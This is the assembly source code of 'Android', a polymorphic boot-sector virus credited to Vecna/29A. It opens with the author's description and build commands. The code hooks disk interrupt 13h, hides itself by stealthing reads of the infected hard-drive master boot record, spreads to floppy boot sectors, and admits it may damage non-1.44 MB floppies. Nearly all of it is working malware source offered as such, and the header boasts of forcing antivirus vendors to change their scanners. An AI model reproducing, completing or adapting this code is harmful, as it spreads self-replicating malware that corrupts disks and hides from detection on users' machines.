   ;
   ;                                                  ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
   ;                                                  ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
   ;    [Android] by Vecna/29A                         ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
   ;    Polymorphic boot virus with VRBL              ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
   ;                                                  ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
   ;
   ; Ok, here is a boot virus which uses my engine, VRBL. The virus is a simple
   ; MBR/BOOT infector, with stealth  only in the harddrive. It is fucking sim-
   ; ple. When you boot from a floppy, it infects the MBR and continues booting
   ; from the harddrive, so, if  you forget  a floppy in the drive  and reboot,
   ; you won't be warned about this. Everything will work nice.
   ;
   ; Int 13h is hooked, and if the harddrive MBR is accessed, the reads will be
   ; stealthed. When a floppy is accessed, the boot sector will be  overwritten
   ; by the random loader, and the virus code will be put in the last sector of
   ; the root dir in 1.44 floppies. Other size of floppies will be probably da-
   ; maged, although this hasn't been tested yet.
   ;
   ; The virus, to be really efficient, needs to be  polymorphic in the code as
   ; well. To detect this virus, you only  need to scan 0/0/3 in harddrives and
   ; 0/1/13 in floppies for a certain  signature. Despite of this, Android will
   ; force AVs to change their scanners, because they  will need to check other
   ; sectors than 0/0/1.
   ;
   ; tasm /m /l android.asm
   ; tlink android.exe
   ; exe2bin android.exe android.com


   .model tiny
   .code
   .386
   org 0

   startvirus:
          xor ax, ax
          cli
          mov ss, ax
          mov sp, 7c00h
          sti
          mov ds, ax
          sub word ptr ds:[413h], 3
          mov ax, word ptr ds:[13h*4]
          mov word ptr cs:[old13], ax
          mov ax, word ptr ds:[13h*4+2]
          mov word ptr cs:[old13+2], ax
          int 12h
          shl ax, 6
          push ax
          pop es
          push cs
          pop ds
          mov cx, offset buffer-offset startvirus
          xor si, si
          mov di, si
          rep movsb
          push es
          push offset highentry
          retf
   highentry:
          push cs
          pop es
          push 0
          pop ds
          mov ax, cs
          mov word ptr ds:[13h*4+2], ax
          mov word ptr ds:[13h*4], offset int13
          push cs
          pop ds
          mov ax, 201h
          mov bx, offset buffer
          mov cx, 3
          mov dx, 80h
          pushf
          call dword ptr cs:[old13]
          mov ax, word ptr [startvirus]
          cmp word ptr [bx], ax
          je hdinfected
   infecthd:
          mov ax, 201h
          mov bx, offset buffer
          mov cx, 1
          mov dx, 80h
          pushf
          call dword ptr cs:[old13]
          mov ax, 301h
          mov bx, offset buffer
          mov cx, 2
          mov dx, 80h
          pushf
          call dword ptr cs:[old13]
          mov ax, 303h
          xor bx, bx
          mov cx, 3
          mov dx, 80h
          pushf
          call dword ptr cs:[old13]
          mov cx, 3
          mov dx, 80h
          mov di, offset buffer
          call makeloader
          mov ax, 301h
          mov bx, offset buffer
          mov cx, 1
          mov dx, 80h
          pushf
          call dword ptr cs:[old13]
   hdinfected:
          push 0
          pop es
          mov ax, 201h
          mov bx, 7c00h
          mov cx, 2
          mov dx, 80h
          pushf
          call dword ptr cs:[old13]
          push es
          push bx
          retf

   random_init:
          ret

   random:
          in al, 40h
          xchg ah, al
          in al, 40h
          ret

   int13:
          cmp ah, 2
          jne exit
          cmp cx, 1
          jne exit
          cmp dh, 0
          jne exit
          pushf
          call dword ptr cs:[old13]
          jc error
          cmp dl, 80h
          jne infect
          mov ax, 201h
          mov cx, 2
          mov dx, 80h
          pushf
          call dword ptr cs:[old13]
          dec cx
          jmp error
   infect:
          pusha
          push es
          push ds
          mov cx, 512
          push es
          push cs
          pop es
          pop ds
          mov si, bx
          mov di, offset buffer
          rep movsb
          push cs
          pop ds
          mov di, offset buffer
          mov word ptr [di], 03cebh
          add di, 3ch
          mov cx, 13
          mov dx, 100h
          call makeloader
          mov ax, 301h
          mov bx, offset buffer
          mov cx, 1
          xor dx, dx
          pushf
          call dword ptr cs:[old13]
          mov ax, 303h
          xor bx, bx
          mov cx, 13
          mov dx, 100h
          pushf
          call dword ptr cs:[old13]
          pop ds
          pop es
          popa
   error:
          retf 2
   exit:
          db 0eah
   old13  dd ?

          db '[Android] by Vecna/29A', 10, 13
          db 'Written in Brazil in 1997', 10, 13

          include vrbl.asm

   seg_need db 65h

   buffer db 512 dup (?)

   end    startvirus
